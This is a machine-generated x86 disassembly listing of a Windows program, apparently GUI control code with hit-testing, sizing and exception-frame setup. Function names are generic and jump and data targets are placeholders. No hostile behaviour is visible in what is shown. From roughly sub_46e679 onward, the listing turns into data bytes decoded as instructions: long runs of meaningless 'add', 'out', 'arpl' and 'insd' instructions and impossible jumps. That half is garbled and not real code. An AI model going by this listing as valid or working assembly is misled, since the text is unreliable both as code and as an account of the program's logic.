call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46dbe8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov al [ ebx + 0x1b4 ]
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
sub al 0x2
jae r-xdata
mov edx [ ebx + 0x1b0 ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ecx esp
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
sub eax edx
mov ecx esp
mov edx 0x3
call sub_417088
adc edx 0x0
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
jmp r-xdata
sub eax [ ebx + 0x1b0 ]
mov edx 0x3
call sub_417088
jmp r-xdata
adc eax 0x0
push 0x2
lea ecx [ esp + 0xc ]
mov edx [ ebx + 0x4c ]
sub edx 0x8
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax esi
call sub_46e5c4
test eax eax
jle r-xdata
mov esi [ ebx + 0x30 ]
mov eax esi
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
sub eax [ ebx + 0x1b0 ]
call sub_417088
lea ecx [ esp + 0xc ]
xor eax eax
mov al [ ebx + 0x5b ]
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x160 ]
call sub_46b278
add esp 0x10
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ ebx + 0x1b0 ]
push eax
lea ecx [ esp + 0x4 ]
mov dl [ ebx + 0x1b4 ]
mov eax [ ebx + 0x160 ]
call sub_46b430
sub_46dd20
push ebx
mov ebx eax
mov eax ebx
call sub_46df3c
test al al
je r-xdata
mov eax ebx
call sub_46d1fc
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
pop ebx
retn
sub_46dd58
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
sub [ esp + 0x8 ] 0x9
test bl bl
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax esi
call sub_46df3c
test al al
je r-xdata
mov edx esp
mov eax esi
call sub_46d388
mov eax [ esp + 0x8 ]
mov [ esp ] eax
add [ esp + 0x8 ] 0x9
test bl bl
jne r-xdata
mov cl 0x1
mov cl 0x1
cmp [ esi + 0x1b0 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx esp
mov eax esi
call sub_46d388
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46ddc0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46deb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x16c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x4c ]
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_417088
lea edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_448ac4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x2ac ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1b0 ] 0x1
xor eax eax
push ebp
push sub_46de97
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46d704
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
sub edx [ eax + 0x40 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_472860
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de9e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1b0 ] 0x0
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46d704
retn
sub_46dec0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
mov eax ebx
call sub_48060c
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
retn
sub_46def4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_46d3c0
mov eax esi
call sub_46df3c
test al al
je r-xdata
test bl bl
jne r-xdata
mov [ esi + 0x1ae ] 0x0
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ esi + 0x1b0 ] 0x1
sub_46df3c
push ebx
add esp 0xffffffe0
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540c8
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_448af0
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax ebx
call sub_4489f4
push eax
lea eax [ esp + 0x1c ]
push eax
mov eax ebx
call sub_4489b0
push eax
mov eax ebx
call sub_4489b0
sub eax 0x9
xor edx edx
pop ecx
call sub_4170c4
lea eax [ esp + 0x18 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
add esp 0x20
pop ebx
retn
sub_46dfa4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46d5f8
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
xor edx edx
call sub_424758
push 0x2
mov eax ebx
call sub_4489f4
sar eax 0x1
jns r-xdata
dec eax
push eax
mov eax ebx
call sub_4489b0
sub eax 0x4
sub eax 0x3
lea ecx [ esp + 0x8 ]
pop edx
call sub_417088
lea ecx [ esp + 0x4 ]
mov dl 0x3
mov eax [ ebx + 0x160 ]
call sub_46b278
pop ecx
pop edx
pop ebx
retn
adc eax 0x0
sub_46e02c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x2a0 ]
mov ebx [ eax ]
call [ ebx + 0x94 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46e054
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_449760
mov eax [ esi + 0x2a0 ]
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov [ edi ] al
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_46e0cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_47eb5c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b39c
mov ebx eax
mov [ esi + 0x1a8 ] ebx
mov eax ebx
xor edx edx
call sub_44fa0c
mov eax [ esi + 0x1a8 ]
mov edx 0x64
call sub_448740
mov eax [ esi + 0x1a8 ]
mov [ eax + 0x124 ] esi
mov [ eax + 0x120 ] sub_46e220
mov [ eax + 0x2a0 ] esi
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46e164
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x1a8 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47ec04
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_46e194
push ebx
mov ebx eax
mov eax ebx
call sub_480724
mov eax [ ebx + 0x1a8 ]
call sub_44fadc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ ebx + 0x1a8 ]
mov edx [ eax + 0x48 ]
mov eax ebx
call sub_448740
mov eax [ ebx + 0x1a8 ]
mov edx [ eax + 0x48 ]
add edx [ ebx + 0x48 ]
mov eax ebx
call sub_448740
jmp r-xdata
sub_46e220
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
mov si 0xffeb
call sub_403324
sub_46e250
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4414a8
mov ebx [ edx ]
add ebx 0xffffff00
sub ebx 0x9
jb r-xdata
pop ebx
pop ebp
retn 0x4
sub_46e278
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47f940
mov esi [ ebx + 0x1a8 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax [ ebx + 0x1a8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46e2a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47fe20
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1a8 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edi eax
mov eax esi
call sub_47b0a8
cmp edi eax
je r-xdata
mov eax esi
call sub_47b0a8
mov edx eax
mov eax [ ebx + 0x1a8 ]
call sub_4482f8
sub_46e2ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax esi
call sub_448540
mov eax [ esi + 0x1a8 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi [ esi + 0x4c ]
sar edi 0x1
jns r-xdata
add edi [ esi + 0x44 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
sub edi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
adc eax 0x0
mov edx [ esi + 0x48 ]
push edx
mov eax [ esi + 0x1a8 ]
mov edx [ eax + 0x4c ]
push edx
mov ecx edi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ esi + 0x1a8 ]
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov edx [ esi + 0x198 ]
add edx ebx
add edx 0x5
mov ecx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_46e388
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44838c
mov edx ebx
mov eax [ esi + 0x1a8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
pop esi
pop ebx
retn
sub_46e3a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x1a8 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_448e80
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_46e3d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47bed4
xor edx edx
mov eax esi
call sub_448498
mov [ esi + 0x9b ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46e420
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov ecx esp
mov eax esi
call sub_448788
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax [ esi + 0x210 ]
test eax eax
je r-xdata
mov eax [ esi + 0x210 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x258 ]
add ebx ebx
mov eax esi
call sub_47cf44
test eax eax
je r-xdata
xor edx edx
call sub_47a120
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
jmp r-xdata
mov dl 0x1
call sub_47a120
mov eax [ esi + 0x258 ]
add eax eax
cmp ebx eax
je r-xdata
mov edx [ eax + 0x40 ]
add ebx [ edx + 0x48 ]
add ebx [ esi + 0x228 ]
mov edx eax
mov eax esi
call sub_47d214
test eax eax
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_448764
mov edx ebx
mov eax esi
call sub_448740
sub_46e4cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4498f8
mov eax [ ebx + 0x280 ]
call sub_403128
xor eax eax
mov [ ebx + 0x280 ] eax
pop ebx
pop ebp
retn 0x4
sub_46e4f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449924
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ed84
mov edi eax
mov [ ebx + 0x280 ] edi
mov [ esi ] edi
pop edi
pop esi
pop ebx
retn
sub_46e524
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea edx [ ebp - 0xc ]
push edx
push ebx
mov ecx [ ebp - 0x4 ]
mov edx esi
call sub_44e2ac
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov [ ebx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
sub_46e584
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_47d4b8
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44c4cc
mov edx ebx
call sub_448924
inc edi
dec esi
jne r-xdata
sub_46e5dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e601
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e608
retn
sub_46e679
out 0x46 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
inc esi
add [ eax ] al
add [ eax ] al
add ah bl
out 0x46 al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
out 0x46 eax
add [ eax + eax ] al
add [ eax ] al
js r-xdata
insd
inc edi
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc ecx
stc
dec ecx
je r-xdata
outsd
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
add eax [ eax ]
adc al 0x0
lea eax [ eax ]
jmp r-xdata
insd
inc ebx
insb
popad
jae r-xdata
jne r-xdata
jo r-xdata
out 0x46 eax
add [ edi ] al
adc [ ecx + eax * 2 + 0x63 ] edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add [ eax ] al
out 0x46 eax
sbb [ eax ] al
js r-xdata
inc ecx
add al bl
and [ edi ] al
xor al 0x1d
inc edi
add ah cl
mov bh 0x44
add [ eax ] al
push ebx
insb
popad
jae r-xdata
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ esp + edi * 8 - 0x1fbffba ] ah
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add al ah
push ss
inc edi
add [ ecx + edx * 4 - 0x23fbffbc ] dl
inc edi
add [ eax ] bl
sbb [ edi ] al
and [ ebx - 0x9f3ffbc ] dh
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
mov esp 0x7c004214
xor eax [ eax ]
cld
outsd
mov eax 0xd2
jmp sub_403eac
call [ rw-data ]
inc edi
je r-xdata
inc esi
add [ ecx ] dl
inc edi
je r-xdata
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
adc al 0x42
insb
inc ebp
js r-xdata
lea eax [ eax ]
jmp r-xdata
sbb al 0x0
jo r-xdata
push eax
jmp 0xffffffffe9c8e7e8
je r-xdata
outsb
inc edx
popad
jb r-xdata
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsd
jbe r-xdata
push edx
insd
dec [ ebp - 0x1816ffc0 ]
inc ecx
stc
dec [ ebp - 0x2016ffc0 ]
inc ecx
stc
dec [ ebp - 0x1833ffc0 ]
inc esi
arpl [ edx + 0x6f ] si
insb
insb
inc edx
je r-xdata
lea eax [ eax ]
jmp r-xdata
push 0xd0046e7
inc edi
je r-xdata
add [ eax + eax ] dl
inc esi
add [ 0x41746547 ] dl
fdiv [ eax ]
inc eax
add [ eax ] dh
std
inc esi
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x20d80041 ] dl
inc edi
add [ ebx - 0x4833ffb9 ] dh
inc esp
insb
inc ebp
js r-xdata
add [ ecx + ebp * 8 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
insb
popad
jae r-xdata
adc [ edi + 0x65 ] eax
je r-xdata
out 0x46 al
add al ah
pop edi
inc edi
add [ eax ] al
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
add [ ebx + esi + 0x40 ] bh
add ah bh
add [ eax ] al
add [ eax - 0x17 ] dl
inc esi
add [ edx + 0x80046e9 ] al
add eax [ eax ]
add [ edi + ecx * 8 + 0x14bc0046 ] bl
inc edx
adc [ ecx + eax * 2 + 0x63 ] edx
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
outsb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
sub_46e8a8
and ch cl
inc edi
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
hlt
sub_46e99e
push esp
inc ebx
jne r-xdata
mov al 0x44
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x2c6fffbf ] dl
inc esi
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
je r-xdata
jl r-xdata
je r-xdata
add al bl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
outsb
jne r-xdata
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ eax - 0x5fffbdef ] ch
inc eax
add ah bh
or eax 0x33840042
inc eax
inc edx
insd
dec ebp
outsb
jne r-xdata
inc esi
add [ esp + edx + 0x337c0042 ] bh
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
js r-xdata
push es
out 0x46 eax
add [ ecx + edx * 8 + 0x46 ] ah
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
add [ ebx + ebp * 8 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x40 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp * 8 - 0x129fffba ] dh
inc esi
add [ eax ] bl
add eax [ eax ]
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0xfffb8dd ] ch
add [ ebx + esi - 0x2cafffc0 ] al
popad
outsb
inc edx
je r-xdata
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
add cl bl
inc esi
je r-xdata
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x21 ] dl
inc edi
add [ eax - 0x61 ] ch
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x2897ffbc ] ch
inc esi
add [ edx * 4 - 0x2493ffbc ] cl
inc esi
add [ ebp * 8 + 0x8340047 ] ah
dec eax
add [ eax ] bh
add eax 0xd38c0048
inc esi
add [ ecx + eax ] cl
dec eax
add al dl
int1
inc edi
add [ eax + ebx * 8 ] cl
inc esi
add ah ah
and [ edi ] eax
enter 0x47f7 0x0
cmp al bh
inc edi
add [ ebp + esi * 8 - 0x2c7ffb9 ] bl
inc edi
add [ ebp + eax - 0x6efffb8 ] ah
inc edi
add [ eax - 0x30fffb8 ] ah
inc edi
add [ eax - 0x2a ] ah
inc esi
add ah dh
xlat
inc esi
add [ eax ] ah
xlat
inc esi
add ah ah
rol [ esi ] 0x1
movsb [ edi ] [ esi ]
add [ eax ] cl
push esp
and al [ edi ]
nop
fld [ esi ]
add [ eax ] eax
fdivp st7
aam 0x21
inc edi
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
add [ eax ] al
adc al 0xea
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2d ] dl
lea eax [ eax ]
and al 0xeb
inc esi
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
jl r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
outsb
jne r-xdata
adc al 0x42
add [ eax - 0x5fffbdef ] ch
lea eax [ eax + eax - 0x2c ]
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x20d80041 ] dl
je r-xdata
add [ ebx + ebp * 8 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jmp r-xdata
popad
jb r-xdata
add al dh
insd
dec ebp
outsb
jne r-xdata
inc edi
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
cwde
or al [ edi ]
rol [ 0xab80047 ] 0x1
inc edi
add ah bl
or al 0x47
add [ eax + 0xd ] bh
inc edi
add al dl
push cs
inc edi
add [ eax + edx + 0xf640047 ] al
inc edi
add [ eax ] ah
add [ edi ] eax
cld
push ss
inc edi
add [ eax ] cl
add [ eax ] al
add [ eax ] edx
mov ah 0xe
mov al 0x3
mov ah 0x21
add [ ecx + eax ] al
add al 0xb4
mov dl 0xff
xor [ eax ] bl
inc edi
add ah ch
add [ edi ] eax
add al 0x1d
inc edi
add [ eax + 0x3c004701 ] bh
sbb eax [ edi ]
pushad
sbb eax [ edi ]
clc
add [ edi ] eax
and [ esi ] al
pushfd
jmp 0x144de9e4
add [ eax - 0x43ffb919 ] al
adc al 0x42
js r-xdata
inc edi
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
adc al 0x8d
inc ecx
add al bl
and [ edi ] al
add al 0x33
popad
outsb
inc edx
je r-xdata
inc edi
add [ ebx + esi ] al
fsub [ eax ]
adc al 0xea
inc esi
add [ ecx + ecx * 8 ] cl
inc esi
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x4004722 ] dh
inc [ eax + eax + 0x24 ]
xor al [ edi ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add ah bh
xor [ edi ] eax
mov eax 0x100044f5
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add al ah
push ss
inc edi
add [ ecx + edx * 4 - 0x23fbffbc ] dl
inc edi
add [ eax ] bl
sbb [ edi ] al
and [ ebx - 0x9f3ffbc ] dh
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ eax + 0x26 ] ch
inc edi
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
add [ eax ] al
pushfd
jmp r-xdata
and eax [ edi ]
sub_46ec4a
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x140047e3
rol [ edi ] 0xf8
rol [ edi ] 0xd4
and eax 0x26380047
inc edi
add [ eax ] ah
int 0x47
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
hlt
sub_46edb0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x46ef
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5fffb911 ] bl
out dx eax
inc esi
add [ eax ] ch
add eax [ eax ]
add [ eax - 0x15 ] dl
inc esi
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0xfffb8cc ] ah
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x20d80041 ] dl
inc edi
add [ ebx + esi ] al
inc edi
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ esp + esi + 0x47 ] cl
add [ esi + edi * 8 ] al
inc esp
add al dl
xor al 0x47
add [ edx + eax + 0x45 ] ch
add al cl
